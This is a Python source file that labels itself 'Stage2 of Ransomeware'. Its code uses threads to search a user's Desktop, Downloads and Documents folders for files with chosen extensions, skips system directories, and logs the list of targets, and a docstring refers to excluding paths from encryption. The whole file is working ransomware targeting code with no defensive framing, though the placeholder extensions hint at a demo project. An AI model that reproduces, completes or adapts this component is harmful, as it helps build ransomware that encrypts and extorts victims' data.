#!/usr/bin/env python

#=========================================================
#This Module is Written to Execute Stage2 of Ransomeware
#=========================================================
# Stage2
#	|____*****TAKES target_extensions and target_directories as ARGUMENTS*****
#	|____Searches for Target Extension Files on Different Thread
#	|____*****RETURN : List of TARGET Files*****


import os, time
import threading #Using Threads to Boost Search Process BY Searching Diff. Drive on Diff. Thread
from os.path import expanduser
from pathlib import Path #Used to Find the Home Path

#Stage2 is Initiated By (Stage2 Class), which depends on (LocateTargetFiles Class)
class Stage2:
    def __init__(self, target_extensions=['.lol', '.mrrobot'], target_directories=['Desktop', 'Downloads', 'Documents']):
        self.list_of_files = []
        self.target_extensions = target_extensions
        self.target_directories = target_directories

    def start(self):
        home = self.get_home_dir()

        threads = []
        for directory in self.target_directories:
            # It's safer to use os.path.join, especially for cross-platform compatibility
            # and to avoid issues with missing slashes.
            full_path = os.path.join(home, directory)
            if os.path.exists(full_path):
                t = threading.Thread(target=self.run_locate_class, args=[full_path,])
                threads.append(t)
                t.start()
            else:
                print(f"[!] Directory not found: {full_path}")

        for t in threads:
            t.join()

        with open('log.txt' , 'w') as f:
            for files in self.list_of_files:
                f.write(files+'\n')

        return self.list_of_files

    def get_home_dir(self):
        # Using expanduser is a more robust way to get the home directory
        return str(Path.home())

    def run_locate_class(self, drive_name):
        '''
        Function to make Object of LocateTargetFiles Class
        '''
        starting = LocateTargetFiles(self.target_extensions)
        list_of_files = starting.start(drive_name)
        self.list_of_files.extend(list_of_files)
        return True

class LocateTargetFiles:
    def __init__(self, target_extensions, exclude = None):
        self.files_on_system = []
        self.target_extension = target_extensions
        # In the future, this could also be configurable
        # For safety, we will always exclude these directories.
        self.exclude_dir = ['C:\\Windows', 'C:\\Program Files', 'C:\\Program Files (x86)', '/usr', '/bin', '/etc']
        if exclude != None:
            self.exclude_dir.extend(exclude)

    def start(self, root_dir):
        self.locate_files(root_dir)
        return self.files_on_system

    def locate_files(self, root_dir):
        for root, _, files in os.walk(root_dir):
            for f in files:
                abs_file_path = os.path.join(root, f)
                self.filter(self.target_extension, abs_file_path)

    def filter(self, target_extension, abs_file_path):
        if self.is_excluded_dir(abs_file_path) == False:
            # Filtering Files On the basics of file extension
            if os.path.splitext(abs_file_path)[1] in self.target_extension and os.path.basename(abs_file_path) != 'log.txt':
                self.files_on_system.append(abs_file_path)
            else:
                pass

    def is_excluded_dir(self, path):
        '''
        @summary: Checks whether the specified path should be excluded from encryption
        @param path: The path to check
        @return: True if the path should be excluded from encryption, otherwise False
        '''
        # Normalize paths for consistent comparison
        normalized_path = os.path.normpath(path)
        for dir_to_exclude in self.exclude_dir:
            normalized_exclude_dir = os.path.normpath(dir_to_exclude)
            if normalized_path.startswith(normalized_exclude_dir):
                return True
        return False
